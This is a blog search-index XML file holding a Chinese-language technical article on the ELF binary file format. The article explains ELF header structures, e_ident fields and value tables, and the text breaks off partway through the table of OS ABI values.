<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>ELF文件格式分析</title>
      <link href="/2021/05/27/ELF_FileFormat_Analysis/"/>
      <url>/2021/05/27/ELF_FileFormat_Analysis/</url>
      <content type="html"><![CDATA[<blockquote><p>1、这篇文章是对ELF文件的一个比较完整的总结。<br>2、部分未写完，有时间再来补。<br><a id="more"></a></p></blockquote><h2 id="1-简介-Introduction"><a href="#1-简介-Introduction" class="headerlink" title="1 简介(Introduction)"></a>1 简介(Introduction)</h2><p>&emsp;&emsp;ELF(Executable and Linkable Format)，即可执行与可链接格式，是可执行文件(Executable Files)、可重定位文件(Relocatable Files)、共享目标文件(Shared Object File)和核心转储(Core Dumps)的通用标准文件格式。首次发布在名为System V Release 4(SVR4)的Unix操作系统版本的应用程序二进制接口(Application Binary Interface,ABI)规范中，随后在工具接口标准(Tool Interface Standard,TIS)中发布，很快就被Unix系统的不同供应商所接受。在1999年，它被86open项目选定为x86处理器上Unix和类Unix系统的标准二进制文件格式，用来取代通用目标文件格式(Common Object File Format,COFF)。</p><p>&emsp;&emsp;通过设计，ELF格式是灵活的，可扩展的和跨平台的。例如，它支持不同的字节序和地址大小，因此它不排除任何特定的中央处理单元(CPU)或指令集体系结构。这使得它可以被许多不同硬件平台上的许多不同操作系统所采用。</p><p>ELF文件的扩展名[^2]：</p><ul><li><strong><code>none</code></strong>: ELF文件可以没有扩展名。</li><li><strong><code>.bin</code></strong>: BIN文件是以二进制格式存储数据的文件。编译的计算机程序就是典型的例子。它与基于文本的文件不同，后者可以在文本编辑器中编辑，而前者不可以在文本编辑器中编辑，但可以在16进制编辑器中进行编辑。磁盘映像(Disk Images)通常是二进制文件，尽管它们经常使用其他文件扩展名。BIN文件也可以用于固件更新[^4]。</li><li><strong><code>.axf</code></strong>: AXF文件是由ARM的RealView编译器(Keil的ARM-MDK的一部分)生成的目标文件格式，并且包含目标代码和调试信息。在调试器中，虽然仅将目标代码加载到目标本身，但是代码和调试信息都会加载到开发主机的内存中。通过JTAG，SWD或其他连接进行调试时(任何类型的-不仅仅是崩溃)，代码都需要在主机上可用，并且调试信息需要将该代码与原始源代码相关联。通过调试连接，仅传输了诸如寄存器值之类的最少数据，因此，例如，调试器将获取程序计数器值，并能够使用AXF中的调试数据显示主机上可用的汇编程序和源代码[^4]。</li><li><strong><code>.o</code></strong>: 可重定位文件(Relocatable File)。见下方。</li><li><strong><code>.elf</code></strong>：可执行文件(Executable File)。见下方。</li><li><strong><code>.so</code></strong>: 共享目标文件(Shared Object File)。见下方。</li><li><strong><code>.ko</code></strong>: 内核对象(Kernel Object)。内核模块。</li><li><strong><code>.prx</code></strong>: 索尼的PRX(PSP Relocation eXecutable?)格式是基于标准ELF格式的重定位可执行文件。它具有自定义的程序头(Program Headers)，非标准MIPS重定位节(Relocation Sections)和唯一的ELF类型，从而与普通的ELF文件区分开。</li><li><strong><code>.puff</code></strong>: </li><li><strong><code>.mod</code></strong>: </li></ul><p>ELF格式的目标文件(Object Files)主要有以下三种类型:</p><ul><li><strong><code>可重定位文件</code></strong>(Relocatable File): 包含由编译器生成的代码以及数据。链接器会将它与其它目标文件链接起来从而创建可执行文件或者共享目标文件。在Linux系统中，这种文件的后缀一般为<code>.o</code> 。</li><li><strong><code>可执行文件</code></strong>(Executable File): 就是我们通常在Linux中执行的程序。</li><li><strong><code>共享目标文件</code></strong>(Shared Object File): 包含代码和数据，这种文件是我们所称的库文件，一般以<code>.so</code>结尾。一般情况下，它有以下两种使用情景：<ul><li><strong><code>链接器</code></strong>(Link eDitor, ld)可能会将它和其它可重定位文件以及共享目标文件一起处理，以生成另外一个目标文件。</li><li><strong><code>动态链接器</code></strong>(Dynamic Linker)将它与可执行文件以及其它共享目标文件组合在一起，以生成进程镜像。</li></ul></li></ul><p>&emsp;&emsp;目标文件由汇编器(Assembler)和链接器(Link Editor)创建，是文本程序(源代码)的二进制形式，可以直接在处理器上运行。那些需要虚拟机才能够执行的程序(例如：Java)不属于这一范围。</p><blockquote><p>本文章使用的Linux Kernel代码：<br><a href="https://code.woboq.org/linux/include/elf.h.html" target="_blank" rel="noopener">/linux/include/elf.h.html,Copyright (C) 1995-2018</a></p></blockquote><h3 id="1-1-文件格式-File-Format"><a href="#1-1-文件格式-File-Format" class="headerlink" title="1.1 文件格式(File Format)"></a>1.1 文件格式(File Format)</h3><p>&emsp;&emsp;目标文件既会参与程序链接(构建程序)又会参与程序执行(运行程序)。出于方便性和效率考虑，根据过程的不同，目标文件格式提供了其内容的两种并行视图，如下：</p><p><center><img src="/resources/2021/ELF_FileFormat_Analysis/Figure_1-1：Object_File_Format.png" alt="Figure 1-1：Object File Format"></center></p><p style="text-align:center;font-weight:bold;margin-top:-20px">Figure 1-1：Object File Format</p><blockquote><p><strong><code>注意</code></strong>：<br>&emsp;&emsp;尽管该图显示程序头表(Program Header Table)紧跟在ELF头(ELF Header)之后，节头表(Section Header Table)紧跟在各节(Sections)之后，但实际文件可能会有所不同。此外，节(Sections)和段(Segments)没有指定的顺序，只有ELF头(ELF Header)在文件中具有固定的位置。</p></blockquote><p>&emsp;&emsp;节(Section)表示可以在ELF文件中处理的最小不可分割的单元。段(Segment)是节(Section)的集合。段(Segment)表示可由exec(2)或运行时链接器映射到内存映像的最小单元[^6]。</p><p>这里给出一个关于链接视图和执行视图比较形象的展示：</p><p><center><img src="/resources/2021/ELF_FileFormat_Analysis/Figure_1-2：Linking_Execution_View.png" alt="Figure 1-2：Linking Execution View"></center></p><p style="text-align:center;font-weight:bold;margin-top:-10px">Figure 1-2：Linking Execution View</p><h4 id="1-1-1-链接视图-Linking-View"><a href="#1-1-1-链接视图-Linking-View" class="headerlink" title="1.1.1 链接视图(Linking View)"></a>1.1.1 链接视图(Linking View)</h4><p>&emsp;&emsp;文件开始处是ELF头(ELF Header)，它给出了整个文件的组织情况。</p><p>&emsp;&emsp;如果程序头表(Program Header Table)存在，它会告诉系统如何创建进程映像。用于构建进程映像(执行程序)的文件必须具有程序头表。但是可重定位文件(Relocatable File)不需要这个表。</p><p>&emsp;&emsp;节(Sections)区域包含了在链接视图中要使用的大部分信息：指令、数据、符号表、重定位信息等等。</p><p>&emsp;&emsp;节头表(Section Header Table)包含了描述文件节(Section)的信息，每个节在节头表中都有一个表项，会给出节的名称、节的大小等信息。用于链接的目标文件必须有节头表，其它目标文件则无所谓，可以有，也可以没有。</p><h4 id="1-1-2-执行视图-Execution-View"><a href="#1-1-2-执行视图-Execution-View" class="headerlink" title="1.1.2 执行视图(Execution View)"></a>1.1.2 执行视图(Execution View)</h4><p>&emsp;&emsp;对于执行视图来说，其主要的不同点在于没有了节(Section)，而有了多个段(Segment)。其实这里的段(Segment)大都是来源于链接视图中的节(Section)。</p><h3 id="1-2-数据表示-Data-Representation"><a href="#1-2-数据表示-Data-Representation" class="headerlink" title="1.2 数据表示(Data Representation)"></a>1.2 数据表示(Data Representation)</h3><p>&emsp;&emsp;目标文件格式支持具有8位/32位/64位架构的各种处理器。当然，这种格式是可以扩展的，也可以支持更小的或者更大位数的处理器架构。因此，目标文件会包含一些控制数据，这部分数据以机器无关的格式进行表示，从而有可能以通用的方式识别目标文件并解释其内容。目标文件中的其它数据采用目标处理器的格式进行编码，与在何种机器上创建没有关系。这里其实想表明的意思是目标文件可以进行交叉编译，我们可以在x86平台生成ARM平台的可执行代码。</p><p>&emsp;&emsp;目标文件格式定义的所有数据结构均遵循相关类的“自然”大小和对齐准则。如有必要，数据结构包含显式填充以确保4字节对象的4字节对齐，从而强制使数据结构的大小为4字节的整数倍，依此类推。文件开头的数据也具有适当的对齐方式，因此，例如，包含Elf32_Addr成员的结构将在文件内的4字节边界上对齐，包含Elf64_Addr成员的结构将在文件内的8字节边界上对齐。出于可移植性的原因，ELF文件格式没有使用位域。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 1-1：32-Bit Data Types</p><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:center">大小</th><th style="text-align:center">对齐方式</th><th style="text-align:left">用途</th></tr></thead><tbody><tr><td style="text-align:left">Elf32_Addr</td><td style="text-align:center">4</td><td style="text-align:center">4</td><td style="text-align:left">无符号程序地址</td></tr><tr><td style="text-align:left">Elf32_Half</td><td style="text-align:center">2</td><td style="text-align:center">2</td><td style="text-align:left">无符号半整型</td></tr><tr><td style="text-align:left">Elf32_Off</td><td style="text-align:center">4</td><td style="text-align:center">4</td><td style="text-align:left">无符号文件偏移</td></tr><tr><td style="text-align:left">Elf32_Sword</td><td style="text-align:center">4</td><td style="text-align:center">4</td><td style="text-align:left">有符号整型</td></tr><tr><td style="text-align:left">Elf32_Word</td><td style="text-align:center">4</td><td style="text-align:center">4</td><td style="text-align:left">无符号整型</td></tr><tr><td style="text-align:left">unsigned char</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:left">无符号小整型</td></tr></tbody></table><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 1-2：64-Bit Data Types</p><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:center">大小</th><th style="text-align:center">对齐方式</th><th style="text-align:left">用途</th></tr></thead><tbody><tr><td style="text-align:left">Elf64_Addr</td><td style="text-align:center">8</td><td style="text-align:center">8</td><td style="text-align:left">无符号程序地址</td></tr><tr><td style="text-align:left">Elf64_Half</td><td style="text-align:center">2</td><td style="text-align:center">2</td><td style="text-align:left">无符号半整型</td></tr><tr><td style="text-align:left">Elf64_Off</td><td style="text-align:center">8</td><td style="text-align:center">8</td><td style="text-align:left">无符号文件偏移</td></tr><tr><td style="text-align:left">Elf64_Sword</td><td style="text-align:center">4</td><td style="text-align:center">4</td><td style="text-align:left">有符号整型</td></tr><tr><td style="text-align:left">Elf64_Word</td><td style="text-align:center">4</td><td style="text-align:center">4</td><td style="text-align:left">无符号整型</td></tr><tr><td style="text-align:left">Elf64_Sxword</td><td style="text-align:center">8</td><td style="text-align:center">8</td><td style="text-align:left">有符号长整型</td></tr><tr><td style="text-align:left">Elf64_Xword</td><td style="text-align:center">8</td><td style="text-align:center">8</td><td style="text-align:left">无符号长整型</td></tr><tr><td style="text-align:left">unsigned char</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:left">无符号小整型</td></tr></tbody></table><h3 id="1-3-字符表示-Character-Representations"><a href="#1-3-字符表示-Character-Representations" class="headerlink" title="1.3 字符表示(Character Representations)"></a>1.3 字符表示(Character Representations)</h3><p>&emsp;&emsp;本节描述默认的ELF字符表示，并定义外部文件使用的标准字符集，这些文件应该可以在系统之间移植。几种外部文件格式用字符表示控制信息。这些单字节字符使用7位ASCII字符集。换句话说，当ELF接口文档提到字符常量时，例如“/”或“\n”，它们的数值应该遵循7位ASCII准则。对于前面的字符常量，单字节值分别为47和10。</p><p>&emsp;&emsp;根据字符编码，0~127范围之外的字符值可能占用一个或多个字节。应用程序可以控制它们自己的字符集，根据需要为不同的语言使用不同的字符集扩展。尽管工具接口标准(Tool Interface Standard,TIS)一致性不限制字符集，但它们通常应遵循一些简单的准则。</p><ul><li>0~127之间的字符值应对应于7位ASCII代码。也就是说，编码超过127的字符集应该包括7位ASCII代码字符集，作为其子集。</li><li>字符值大于127的多字节字符编码应该仅包含值在0到127范围之外的字节。也就是说，每个字符使用超过一个字节的字符集不应该在多字节、非ASCII字符中“嵌入”类似于7位ASCII字符的字节。</li><li>多字节字符应该是自识别的。例如，这允许在任何多字节字符对之间插入任何多字节字符，而不会改变字符的解释。</li></ul><p>&emsp;&emsp;这些注意事项与多语言(多国语言)应用程序特别相关。</p><blockquote><p>注意：ELF常量有指定处理器范围的命名约定。用于处理器特定扩展的名称，例如：DT<em>、PT</em>，包含了处理器种类的名称，例如：DT_M32_SPECIAL。但是，不使用此约定的现有处理器扩展将受到支持。例如：DT_JMP_REL。</p></blockquote><h2 id="2-ELF头-ELF-Header"><a href="#2-ELF头-ELF-Header" class="headerlink" title="2 ELF头(ELF Header)"></a>2 ELF头(ELF Header)</h2><p>&emsp;&emsp;某些目标文件控制结构可以增长，因为ELF头(ELF Header)包含它们的实际大小。如果目标文件格式发生变化，程序可能会遇到比预期更大或更小的控制结构。因此，程序可能会忽略“额外”的信息。“缺失”的信息的处理取决于上下文，并将在定义扩展时指定。</p><p>&emsp;&emsp;ELF头(ELF Header)描述了ELF文件的概要信息，利用这个数据结构可以索引到ELF文件的全部信息，数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_NIDENT (16)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT];   <span class="comment">/* Magic number and other info */</span></span><br><span class="line">    Elf32_Half    e_type;               <span class="comment">/* Object file type */</span></span><br><span class="line">    Elf32_Half    e_machine;            <span class="comment">/* Architecture */</span></span><br><span class="line">    Elf32_Word    e_version;            <span class="comment">/* Object file version */</span></span><br><span class="line">    Elf32_Addr    e_entry;              <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">    Elf32_Off     e_phoff;              <span class="comment">/* Program header table file offset */</span></span><br><span class="line">    Elf32_Off     e_shoff;              <span class="comment">/* Section header table file offset */</span></span><br><span class="line">    Elf32_Word    e_flags;              <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">    Elf32_Half    e_ehsize;             <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">    Elf32_Half    e_phentsize;          <span class="comment">/* Program header table entry size */</span></span><br><span class="line">    Elf32_Half    e_phnum;              <span class="comment">/* Program header table entry count */</span></span><br><span class="line">    Elf32_Half    e_shentsize;          <span class="comment">/* Section header table entry size */</span></span><br><span class="line">    Elf32_Half    e_shnum;              <span class="comment">/* Section header table entry count */</span></span><br><span class="line">    Elf32_Half    e_shstrndx;           <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT];   <span class="comment">/* Magic number and other info */</span></span><br><span class="line">    Elf64_Half    e_type;               <span class="comment">/* Object file type */</span></span><br><span class="line">    Elf64_Half    e_machine;            <span class="comment">/* Architecture */</span></span><br><span class="line">    Elf64_Word    e_version;            <span class="comment">/* Object file version */</span></span><br><span class="line">    Elf64_Addr    e_entry;              <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">    Elf64_Off     e_phoff;              <span class="comment">/* Program header table file offset */</span></span><br><span class="line">    Elf64_Off     e_shoff;              <span class="comment">/* Section header table file offset */</span></span><br><span class="line">    Elf64_Word    e_flags;              <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">    Elf64_Half    e_ehsize;             <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">    Elf64_Half    e_phentsize;          <span class="comment">/* Program header table entry size */</span></span><br><span class="line">    Elf64_Half    e_phnum;              <span class="comment">/* Program header table entry count */</span></span><br><span class="line">    Elf64_Half    e_shentsize;          <span class="comment">/* Section header table entry size */</span></span><br><span class="line">    Elf64_Half    e_shnum;              <span class="comment">/* Section header table entry count */</span></span><br><span class="line">    Elf64_Half    e_shstrndx;           <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;其中每个成员都是以“e_”开头的，应该都是ELF的缩写。每个成员具体的说明如下。</p><ul><li><strong><code>e_ident</code></strong>: ELF头(ELF Header)或目标文件的初始字节将文件标记为目标文件，并提供与机器无关的数据，用于解码和解释文件的内容。</li><li><strong><code>e_type</code></strong>: e_type标识目标文件类型。</li><li><strong><code>e_machine</code></strong>: e_machine指定了当前文件可以运行的处理器架构(指令集)。</li><li><strong><code>e_version</code></strong>: e_version标识目标文件的版本。</li><li><strong><code>e_entry</code></strong>: 这一项为系统转交控制权给ELF中相应代码的虚拟地址，从而启动进程。如果ELF文件没有相关的入口点(Entry Point)，则该成员保持为0。</li><li><strong><code>e_phoff</code></strong>: 这一项给出程序头表(Program Header Table)在文件中的字节偏移(Program Header table OFFset)。如果文件中没有程序头表，则为0。</li><li><strong><code>e_shoff</code></strong>: 这一项给出节头表(Section Header Table)在文件中的字节偏移(Section Header table OFFset)。如果文件中没有节头表，则为0。</li><li><strong><code>e_flags</code></strong>: 这一项给出文件中与特定处理器相关的标志，这些标志命名格式为EF_machine_flag。</li><li><strong><code>e_ehsize</code></strong>: 这一项给出ELF头(ELF Header)的字节长度(ELF Header Size)。</li><li><strong><code>e_phentsize</code></strong>: 这一项给出程序头表(Program Header Table)中每个表项的字节长度(Program Header ENTry SIZE)。每个表项的大小相同。</li><li><strong><code>e_phnum</code></strong>: 这一项给出程序头表的项数(Program Header entry NUMber)。因此，e_phnum与e_phentsize的乘积即为程序头表的字节长度。如果文件中没有程序头表，则该项值为0。<br> &emsp;&emsp;如果程序头(Program Header Table)的数量大于65534，则该成员的值为PN_XNUM(0xFFFF)。程序头表(Program Header Table)条目的实际数量包含在索引0处的节头(Section Header)的sh_info字段中。否则，初始节头条目的sh_info成员值为0。请参见“扩展的节头”[^6]。</li><li><strong><code>e_shentsize</code></strong>: 这一项给出节头表(Section Header Table)中每个表项的字节长度(Section Header ENTry SIZE)。节头表中所有项占据的空间大小相同。</li><li><strong><code>e_shnum</code></strong>: 这一项给出节头表的项数(Section Header NUMber)。因此，e_shnum与e_shentsize的乘积即为节头表的字节长度。如果文件中没有节头表，则该项值为0。<br> &emsp;&emsp;如果节的数量大于65279，则e_shnum的值为0。节头表(Section Header Table)条目的实际数量包含在索引0处的节头(Section Header)的sh_size字段中。否则，初始节头条目的sh_size成员的值为0。请参见“扩展的节头”[^6]。</li><li><strong><code>e_shstrndx</code></strong>: 这一项给出节头表(Section Header Table)中与节名称字符串表(Section Header String Table)相关的表项的索引值(Section Header STRing table iNDeX)。如果文件中没有节名称字符串表，则该项值为SHN_UNDEF。关于细节的介绍，请参考后面的“节(Sections)”和“字符串表(String Table)”部分。<br> &emsp;&emsp;如果节名称字符串表(Section Header String Table)的节索引大于65279，则该成员的值为SHN_XINDEX(0xFFFF)，并且节名称字符串表节的实际索引包含在索引0处的节头的sh_link字段中。否则，初始节头条目的sh_link成员的值为0。请参见“扩展的节头”[^6]。</li></ul><h3 id="2-1-初始数组-e-ident-EI-NIDENT"><a href="#2-1-初始数组-e-ident-EI-NIDENT" class="headerlink" title="2.1 初始数组(e_ident[EI_NIDENT])"></a>2.1 初始数组(e_ident[EI_NIDENT])</h3><p>&emsp;&emsp;如上所述，ELF提供了一个目标文件框架来支持多处理器、多数据编码以及多种类型的机器。为了支持这个目标文件族，文件的初始字节指定了如何解释机器无关的文件内容，并且独立于文件的剩余内容。</p><p>&emsp;&emsp;ELF头(ELF Header)或目标文件的初始字节对应于e_ident成员。这个数组对于不同的下标的含义如下：</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 2-1：e_ident[] Identification Indexes</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值(数组下标)</th><th style="text-align:left">用途</th></tr></thead><tbody><tr><td style="text-align:left">EI_MAG0</td><td style="text-align:center">0</td><td style="text-align:left">文件标识字节0的索引</td></tr><tr><td style="text-align:left">EI_MAG1</td><td style="text-align:center">1</td><td style="text-align:left">文件标识字节1的索引</td></tr><tr><td style="text-align:left">EI_MAG2</td><td style="text-align:center">2</td><td style="text-align:left">文件标识字节2的索引</td></tr><tr><td style="text-align:left">EI_MAG3</td><td style="text-align:center">3</td><td style="text-align:left">文件标识字节3的索引</td></tr><tr><td style="text-align:left">EI_CLASS</td><td style="text-align:center">4</td><td style="text-align:left">文件类型字节的索引</td></tr><tr><td style="text-align:left">EI_DATA</td><td style="text-align:center">5</td><td style="text-align:left">数据编码字节的索引</td></tr><tr><td style="text-align:left">EI_VERSION</td><td style="text-align:center">6</td><td style="text-align:left">文件版本字节的索引</td></tr><tr><td style="text-align:left">EI_OSABI</td><td style="text-align:center">7</td><td style="text-align:left">操作系统ABI标识字节的索引</td></tr><tr><td style="text-align:left">EI_ABIVERSION</td><td style="text-align:center">8</td><td style="text-align:left">ABI版本字节的索引</td></tr><tr><td style="text-align:left">EI_PAD</td><td style="text-align:center">9</td><td style="text-align:left">填充字节的起始字节的索引</td></tr><tr><td style="text-align:left">EI_NIDENT</td><td style="text-align:center">16</td><td style="text-align:left">e_ident[]数组的大小</td></tr></tbody></table><h4 id="2-1-1-e-ident-EI-MAG0-e-ident-EI-MAG3"><a href="#2-1-1-e-ident-EI-MAG0-e-ident-EI-MAG3" class="headerlink" title="2.1.1 e_ident[EI_MAG0] ~ e_ident[EI_MAG3]"></a>2.1.1 e_ident[EI_MAG0] ~ e_ident[EI_MAG3]</h4><p>&emsp;&emsp;这些索引访问到的字节保存一下的值。e_ident[EI_MAG0]到e_ident[EI_MAG3]，即文件的头4个字节，被称作“魔数(Magic Number)”，标识该文件是一个ELF目标文件。至于开头为什么是0x7f，并没有仔细去查过。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 2-2：Magic Number</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">ELFMAG0</td><td style="text-align:center">0x7f</td><td style="text-align:left">e_ident[EI_MAG0]的字节值，魔数字节0</td></tr><tr><td style="text-align:left">ELFMAG1</td><td style="text-align:center">‘E’</td><td style="text-align:left">e_ident[EI_MAG1]的字节值，魔数字节1</td></tr><tr><td style="text-align:left">ELFMAG2</td><td style="text-align:center">‘L’</td><td style="text-align:left">e_ident[EI_MAG2]的字节值，魔数字节2</td></tr><tr><td style="text-align:left">ELFMAG3</td><td style="text-align:center">‘F’</td><td style="text-align:left">e_ident[EI_MAG3]的字节值，魔数字节3</td></tr></tbody></table><h4 id="2-1-2-e-ident-EI-CLASS"><a href="#2-1-2-e-ident-EI-CLASS" class="headerlink" title="2.1.2 e_ident[EI_CLASS]"></a>2.1.2 e_ident[EI_CLASS]</h4><p>&emsp;&emsp;e_ident[EI_CLASS]为e_ident[EI_MAG3]的下一个字节，标识文件的类型或容量。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 2-3：e_ident[EI_CLASS] Value</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">ELFCLASSNONE</td><td style="text-align:center">0</td><td style="text-align:left">无效的类型</td></tr><tr><td style="text-align:left">ELFCLASS32</td><td style="text-align:center">1</td><td style="text-align:left">32位ELF文件</td></tr><tr><td style="text-align:left">ELFCLASS64</td><td style="text-align:center">2</td><td style="text-align:left">64位ELF文件</td></tr><tr><td style="text-align:left">ELFCLASSNUM</td><td style="text-align:center">3</td><td style="text-align:left">类型的数量</td></tr></tbody></table><p>&emsp;&emsp;ELF文件的设计使得它可以在多种字节长度的机器之间移植，而不需要强制规定机器的最长字节长度和最短字节长度。文件的类型定义了对象文件容器的数据结构所使用的基本类型。包含在目标文件节(Section)中的数据可以遵循不同的编程模型[^6]。</p><p>&emsp;&emsp;ELFCLASS32类型支持文件大小和虚拟地址空间上限为4GB的机器，例如：x86；它使用上述定义中的基本类型。</p><p>&emsp;&emsp;ELFCLASS64类型指的是64位架构，例如：64位的SPARC和x86-x64。</p><p>&emsp;&emsp;它出现在此处，展示了目标文件可能会如何更改。其他类型将根据需要定义，目标文件数据具有不同的基本类型和大小。</p><h4 id="2-1-3-e-ident-EI-DATA"><a href="#2-1-3-e-ident-EI-DATA" class="headerlink" title="2.1.3 e_ident[EI_DATA]"></a>2.1.3 e_ident[EI_DATA]</h4><p>&emsp;&emsp;e_ident[EI_DATA]字节给出了目标文件中的特定处理器数据的编码方式。这将影响从偏移量0x10开始的多字节字段的解释。下面是目前已定义的编码：</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 2-4：e_ident[EI_DATA] Value</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">ELFDATANONE</td><td style="text-align:center">0</td><td style="text-align:left">无效数据编码</td></tr><tr><td style="text-align:left">ELFDATA2LSB</td><td style="text-align:center">1</td><td style="text-align:left">小端序(Little-endian)</td></tr><tr><td style="text-align:left">ELFDATA2MSB</td><td style="text-align:center">2</td><td style="text-align:left">大端序(Big-endian)</td></tr><tr><td style="text-align:left">ELFDATANUM</td><td style="text-align:center">3</td><td style="text-align:left">数据编码种类的数量</td></tr></tbody></table><p>&emsp;&emsp;有关这些编码的更多信息如下所示。其他值被保留并将根据需要分配给新的编码。</p><p>&emsp;&emsp;文件数据编码方式表明了文件内容的解析方式。正如之前所述，ELFCLASS32类型文件和ELFCLASS64类型文件使用了占用1，2，4和8字节的整数来表示偏移量，地址和其他信息。对于已定义的不同的编码方式，其表示如下所示，其中字节号在左上角。</p><p>&emsp;&emsp;编码ELFDATA2LSB使用2的补码，最低有效字节(Least Significant Byte)占据最低地址。这种编码通常被非正式地称为小端序(Little Endian)。</p><p><center><img src="/resources/2021/ELF_FileFormat_Analysis/Figure_2-1：Data_Encoding_ELFDATA2LSB.png" alt="Figure 2-1：Data Encoding ELFDATA2LSB"></center></p><p style="text-align:center;font-weight:bold;margin-top:-20px">Figure 2-1：Data Encoding ELFDATA2LSB</p><p>&emsp;&emsp;编码ELFDATA2MSB使用2的补码，最高有效字节(Most Significant Byte)占据最低地址。这种编码通常被非正式地称为大端序(Big Endian)。</p><p><center><img src="/resources/2021/ELF_FileFormat_Analysis/Figure_2-2：Data_Encoding_ELFDATA2MSB.png" alt="Figure 2-2：Data Encoding ELFDATA2MSB"></center></p><p style="text-align:center;font-weight:bold;margin-top:-20px">Figure 2-2：Data Encoding ELFDATA2MSB</p><h4 id="2-1-4-e-ident-EI-VERSION"><a href="#2-1-4-e-ident-EI-VERSION" class="headerlink" title="2.1.4 e_ident[EI_VERSION]"></a>2.1.4 e_ident[EI_VERSION]</h4><p>&emsp;&emsp;字节e_ident[EI_VERSION]指定ELF头(ELF Header)的版本号。当前，此值必须为EV_CURRENT，如介绍e_version时所说的那样。</p><h4 id="2-1-5-e-ident-EI-OSABI"><a href="#2-1-5-e-ident-EI-OSABI" class="headerlink" title="2.1.5 e_ident[EI_OSABI]"></a>2.1.5 e_ident[EI_OSABI]</h4><p>&emsp;&emsp;字节e_ident[EI_OSABI]指示此ELF文件能够运行的目标操作系统ABI编号。其他ELF结构中的一些字段具有操作系统或ABI特定含义的标志和值，这些字段的解释由该字节的值决定。无论目标平台是什么，它通常都被设置为0。目前定义的不同操作系统ABI对应的编号如下：</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 2-5：e_ident[EI_OSABI] Value</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">ELFOSABI_NONE</td><td style="text-align:center">0</td><td style="text-align:left">No extensions or unspecified</td></tr><tr><td style="text-align:left">ELFOSABI_SYSV</td><td style="text-align:center">0</td><td style="text-align:left">UNIX System V ABI</td></tr><tr><td style="text-align:left">ELFOSABI_HPUX</td><td style="text-align:center">1</td><td style="text-align:left">HP-UX ABI</td></tr><tr><td style="text-align:left">ELFOSABI_NETBSD</td><td style="text-align:center">2</td><td style="text-align:left">NetBSD ABI</td></tr><tr><td style="text-align:left">ELFOSABI_LINUX</td><td style="text-align:center">3</td><td style="text-align:left">Linux ABI</td></tr><tr><td style="text-align:left">ELFOSABI_HURD</td><td style="text-align:center">4</td><td style="text-align:left">GNU Hurd ABI</td></tr><tr><td style="text-align:left">ELFOSABI_SOLARIS</td><td style="text-align:center">6</td><td style="text-align:left">Sun Solaris ABI</td></tr><tr><td style="text-align:left">ELFOSABI_AIX</td><td style="text-align:center">7</td><td style="text-align:left">IBM AIX ABI</td></tr><tr><td style="text-align:left">ELFOSABI_IRIX</td><td style="text-align:center">8</td><td style="text-align:left">SGI Irix ABI</td></tr><tr><td style="text-align:left">ELFOSABI_FREEBSD</td><td style="text-align:center">9</td><td style="text-align:left">FreeBSD ABI</td></tr><tr><td style="text-align:left">ELFOSABI_TRU64</td><td style="text-align:center">10</td><td style="text-align:left">Compaq TRU64 UNIX ABI</td></tr><tr><td style="text-align:left">ELFOSABI_MODESTO</td><td style="text-align:center">11</td><td style="text-align:left">Novell Modesto ABI</td></tr><tr><td style="text-align:left">ELFOSABI_OPENBSD</td><td style="text-align:center">12</td><td style="text-align:left">OpenBSD ABI</td></tr><tr><td style="text-align:left">ELFOSABI_OPENVMS</td><td style="text-align:center">13</td><td style="text-align:left">OpenVMS 